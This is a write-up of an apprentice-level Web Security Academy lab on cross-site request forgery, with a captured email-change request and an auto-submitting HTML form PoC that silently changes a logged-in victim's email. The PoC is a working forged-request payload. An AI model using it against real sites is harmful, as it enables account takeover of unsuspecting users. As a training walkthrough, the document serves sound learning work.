# CSRF Vulnerability with No Defenses

![Difficulty](https://img.shields.io/badge/Difficulty-APPRENTICE-brightgreen) ![Category](https://img.shields.io/badge/Category-CSRF-blue)

## Objective

> The email change functionality is vulnerable to CSRF. Goal is to craft an HTML page that changes the victim's email and host it on the exploit server.

## Steps

### 1. Intercept the email change request

Fire up Burp Suite, log in as `wiener:peter`, and change the email. Intercept the request and inspect it.

```http
POST /my-account/change-email HTTP/2
Host: 0a140038035928d8801f038c00bc00c5.web-security-academy.net
Cookie: session=JMfQXFIbz5GzCAHXSuvs39fzlYS1qK0q
Content-Type: application/x-www-form-urlencoded

email=ahmed%40gmail.com
```

### 2. Spot the vulnerability

No CSRF token anywhere in the request. Session is tracked via cookie only — that's the vulnerability right there, nothing to validate the request origin.

### 3. Build and deliver the PoC

Generate the CSRF PoC from Burp and host it on the exploit server. When the victim visits the page, the form auto-submits and changes their email.

## PoC

```html
<html>
  <body>
    <form action="https://0a140038035928d8801f038c00bc00c5.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="ahmed@gmail.com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

## Why It Works

The app relies solely on session cookies to authenticate requests with no CSRF token or origin validation. Any page can silently trigger a state-changing POST on behalf of a logged-in user — the browser attaches the cookie automatically.

## Key Takeaways

- No CSRF token = no way to distinguish legitimate requests from forged ones
- Session cookies alone are not enough to protect state-changing endpoints
- Burp's "Generate CSRF PoC" makes building the attack trivial

---

جاهز! انسخه على GitHub مباشرة 🎯
